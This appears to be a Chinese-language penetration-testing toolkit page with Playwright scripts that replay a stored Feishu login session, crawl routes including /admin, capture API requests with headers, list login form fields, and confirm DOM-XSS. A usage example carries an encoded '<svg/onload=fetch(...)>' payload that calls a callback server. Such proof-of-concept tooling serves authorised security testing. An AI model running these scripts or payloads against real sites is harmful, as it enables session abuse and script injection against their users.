# Playwright 会话导入与动态请求抓取脚本

**用途**：
1. 导入用户授权的飞书 OAuth / 扫码登录后 storageState
2. 遍历前端页面，抓取动态请求
3. 执行 DOM-XSS 触发验证

## 1. 会话导入脚本

保存为 `poc/import_session.js`：

```javascript
const { chromium } = require('playwright');
const fs = require('fs');

const TARGET = process.env.TARGET_URL || 'https://<target>/';
const STORAGE = process.env.STORAGE_STATE || 'auth/storage_state_user.json';
const OUT = 'evidence/session_after.json';

(async () => {
  if (!fs.existsSync(STORAGE)) {
    console.error(`storage_state 不存在: ${STORAGE}`);
    process.exit(1);
  }
  const browser = await chromium.launch({ headless: true });
  const context = await browser.newContext({
    storageState: STORAGE,
    ignoreHTTPSErrors: true
  });
  const page = await context.newPage();
  
  const apis = [];
  page.on('request', r => {
    if (r.url().match(/\/api\//)) {
      apis.push({m: r.method(), u: r.url(), h: r.headers()});
    }
  });
  page.on('response', async r => {
    if (r.url().match(/\/api\//)) {
      try {
        const body = await r.text();
        apis[apis.length-1].resp = {code: r.status(), body: body.slice(0, 2000)};
      } catch(e){}
    }
  });
  page.on('console', m => console.log('CONSOLE:', m.text()));
  page.on('pageerror', e => console.log('PAGEERR:', e.message));
  
  await page.goto(TARGET, { waitUntil: 'networkidle', timeout: 30000 });
  await page.waitForTimeout(3000);
  
  // 遍历常见路由
  const paths = ['/login', '/', '/dashboard', '/admin', '/settings', '/profile'];
  for (const p of paths) {
    try {
      await page.goto(TARGET.replace(/\/$/, '') + p, { waitUntil: 'networkidle', timeout: 15000 });
      await page.waitForTimeout(1500);
    } catch(e) {}
  }
  
  fs.writeFileSync(OUT, JSON.stringify(await context.storageState(), null, 2));
  fs.writeFileSync('evidence/dynamic_apis.json', JSON.stringify(apis, null, 2));
  console.log(`API calls captured: ${apis.length}`);
  await browser.close();
})();
```

## 2. DOM-XSS 触发验证

保存为 `poc/dom_xss_trigger.js`：

```javascript
const { chromium } = require('playwright');

const TARGET = process.env.TARGET_URL;
const PAYLOAD_URL = process.env.PAYLOAD_URL;  // 含 <svg/onload=fetch> 的完整 URL
const CALLBACK_URL = process.env.CALLBACK_URL;  // 你的回连服务器

(async () => {
  const browser = await chromium.launch({ headless: true });
  const context = await browser.newContext({ storageState: 'auth/storage_state_user.json' });
  const page = await context.newPage();
  
  let consoleErrors = [];
  page.on('console', m => consoleErrors.push(m.text()));
  page.on('pageerror', e => consoleErrors.push('ERR: ' + e.message));
  page.on('request', r => {
    if (r.url().startsWith(CALLBACK_URL)) {
      console.log('✅ CALLBACK HIT:', r.url());
    }
  });
  
  await page.goto(PAYLOAD_URL, { waitUntil: 'networkidle', timeout: 15000 });
  await page.waitForTimeout(5000);
  
  console.log('Console logs:', consoleErrors);
  await page.screenshot({ path: 'evidence/xss_trigger.png', fullPage: true });
  await browser.close();
})();
```

## 3. 遍历所有路由

保存为 `poc/route_crawl.js`：

```javascript
const { chromium } = require('playwright');

const TARGET = process.env.TARGET_URL;
const STORAGE = process.env.STORAGE_STATE || 'auth/storage_state_user.json';

(async () => {
  const browser = await chromium.launch({ headless: true });
  const context = await browser.newContext({
    storageState: STORAGE,
    ignoreHTTPSErrors: true
  });
  const page = await context.newPage();
  page.setDefaultTimeout(10000);
  
  // 读取 api-recon 的 routes.txt
  const routes = require('fs').readFileSync('recon/routes.txt', 'utf-8').split('\n').filter(Boolean);
  
  for (const r of routes.slice(0, 50)) {  // 限制数量
    try {
      const resp = await page.goto(TARGET + r, { waitUntil: 'domcontentloaded' });
      await page.waitForTimeout(1000);
      console.log(`${resp?.status()} ${TARGET}${r}`);
    } catch(e) {
      console.log(`FAIL ${TARGET}${r}: ${e.message}`);
    }
  }
  
  await browser.close();
})();
```

## 4. 表单交互

保存为 `poc/form_fill.js`：

```javascript
const { chromium } = require('playwright');

(async () => {
  const browser = await chromium.launch({ headless: true });
  const page = await browser.newPage();
  await page.goto(process.env.TARGET_URL + '/login');
  
  // 抓所有输入框和按钮
  const inputs = await page.$$eval('input,textarea', els => els.map(e => ({
    type: e.type, name: e.name, id: e.id, placeholder: e.placeholder
  })));
  const buttons = await page.$$eval('button,[type=submit]', els => els.map(e => ({
    text: e.textContent.trim(), type: e.type
  })));
  
  console.log('Inputs:', inputs);
  console.log('Buttons:', buttons);
  await browser.close();
})();
```

## 5. 命令行使用

```bash
# 会话导入
TARGET_URL=https://example.com/ STORAGE_STATE=auth/storage_state_user.json \
  node poc/import_session.js

# DOM-XSS 触发
TARGET_URL=https://example.com/ \
  PAYLOAD_URL="https://example.com/search?q=%3Csvg%2Fonload%3Dfetch%28%27http%3A%2F%2F127.0.0.1%3A8088%2Fhit%27%29%3E" \
  CALLBACK_URL=http://127.0.0.1:8088 \
  node poc/dom_xss_trigger.js

# 路由遍历
TARGET_URL=https://example.com/ STORAGE_STATE=auth/storage_state_user.json \
  node poc/route_crawl.js
```

## 6. 依赖安装

```bash
npm install playwright
playwright install chromium
```

已装好则跳过。
